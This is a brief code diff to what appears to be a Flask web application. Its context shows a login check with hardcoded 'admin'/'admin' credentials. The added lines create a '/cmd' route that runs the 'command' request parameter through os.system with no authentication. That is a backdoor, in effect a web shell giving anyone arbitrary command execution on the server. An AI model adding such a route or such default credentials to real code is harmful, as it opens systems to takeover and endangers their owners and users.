@@ -9,3 +9,10 @@ def login():
     if username == "admin" and password == "admin":
         return "Logged in"
     return "Invalid"
+
+import os
+
+@app.route("/cmd")
+def cmd():
+    return os.system(request.args.get("command"))
+
